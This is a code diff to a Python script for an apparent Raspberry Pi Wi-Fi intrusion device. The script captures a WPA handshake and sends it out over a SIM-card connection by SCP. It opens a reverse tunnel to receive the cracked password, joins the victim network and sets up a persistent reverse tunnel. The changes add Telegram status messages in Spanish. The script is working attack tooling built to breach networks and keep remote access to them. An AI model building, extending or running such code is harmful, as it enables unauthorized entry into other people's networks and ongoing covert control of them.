@@ -1,5 +1,5 @@
 import subprocess
-import signal
+import requests
 import json
 import time
 import sys
@@ -9,9 +9,10 @@ from common_functions import get_config_field, write_log
 
 from components.airmon import Airmon
 from components.airodump import Airodump
-from components.aircrack import Aircrack
 
 from send_handshake_methods import send_through_scp
+
+from telegram_api import TelegramBot
 
 
 def check_config_file():
@@ -84,17 +85,11 @@ def kill_process(process):
 
         
 def enable_internet_through_sim():
-    command = 'service NetworkManager restart'
-    output = subprocess.run(command, shell=True, capture_output=True, text=True)
-    if output.stderr:
-        write_log(f'[!] Error executing command "{command}"')
-        sys.exit(1)
-        
     try:
         file_path = os.path.join('minicom', 'init.txt')
         with open(file_path) as _:
-            command = f'minicom -D /dev/ttyUSB2 -S {file_path}'
-            subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            command = ['minicom', '-D', '/dev/ttyUSB2', '-S', file_path]
+            process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
             time.sleep(30)
             
@@ -104,8 +99,31 @@ def enable_internet_through_sim():
                 write_log(f'[!] Error executing command "{command}"')
                 sys.exit(1)
             
+            return process
+            
     except FileNotFoundError:
         write_log(f'[!] Script to start internet through SIM card does not exists')
+        sys.exit(1)
+        
+        
+def disable_internet_through_sim():
+    try:
+        file_path = os.path.join('minicom', 'stop.txt')
+        with open(file_path) as f:
+            command = 'dhclient -r usb0'
+            subprocess.run(command, shell=True, text=True)
+            
+            time.sleep(10)
+            
+            command = ['minicom', '-D', '/dev/ttyUSB2', '-S', file_path]
+            process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            time.sleep(30)
+            
+            kill_process(process)
+            
+    except FileNotFoundError:
+        write_log(f'[!] Script to stop internet through SIM card does not exists')
         sys.exit(1)
 
 
@@ -150,8 +168,36 @@ def connect_to_network(network_ssid: str, cracked_password: str):
     time.sleep(30)
 
     # Getting an IP
-    command = f'dhclient -r; dhclient wlan0'
+    command = 'dhclient wlan0'
     output = subprocess.run(command, shell=True, text=True)
+    
+    time.sleep(10)
+    
+    # Check if raspberry is connected
+    try:
+        response = requests.get('https://www.kali.org')
+    except Exception:
+        # Reload dhclient
+        command = 'dhclient wlan0'
+        output = subprocess.run(command, shell=True, text=True)
+        time.sleep(10)
+    
+    
+def initialize_telegram_bot():
+    telegram_bot = None
+    
+    telegram_bot_information = get_config_field('telegram_bot')
+    if telegram_bot_information and 'api_token' in telegram_bot_information:
+        telegram_bot = TelegramBot(telegram_bot_information.get('api_token'))
+    else:
+        write_log('[!] Telegram bot information uncomplete. It has not been created')
+        
+    return telegram_bot
+    
+    
+def telegram_message(telegram_bot: TelegramBot | None, message: str):
+    if telegram_bot:
+        telegram_bot.send_message(message)
 
 
 if __name__ == '__main__':
@@ -176,25 +222,34 @@ if __name__ == '__main__':
     
     # Stop monitor mode and enable internet through SIM
     airmon.stop_monitor_mode(monitor_interface)
-    enable_internet_through_sim()
+    sim_internet_process = enable_internet_through_sim()
+    
+    # Initialize telegram bot to notify
+    telegram_bot: TelegramBot | None = initialize_telegram_bot()
     
     # Send captured handshake
     send_captured_handshake(handshake_file_name)
+    telegram_message(telegram_bot, 'Handshake en formato hashcat enviado')
             
     # Open reverse tunnel to receive cracked password
-    process = open_reverse_tunnel()
+    reverse_tunnel_process = open_reverse_tunnel()
+    telegram_message(telegram_bot, 'Tunel abierto a la espera de recibir la password crackeada')
     
     cracked_password = wait_for_cracked_password()
     if not cracked_password:
         write_log('[!] Something went wrong reading cracked password')
     
-    kill_process(process)
+    kill_process(reverse_tunnel_process)
+    kill_process(sim_internet_process)
+    
+    disable_internet_through_sim()
     
     # Connect to cracked network
     connect_to_network(network_ssid, cracked_password)
     
     # Open reverse tunnel
     open_reverse_tunnel(persistent=True)
+    telegram_message(telegram_bot, 'Tunel persistente abierto')
     
     '''
     Listo!! A partir de aqui a lanzar scripts
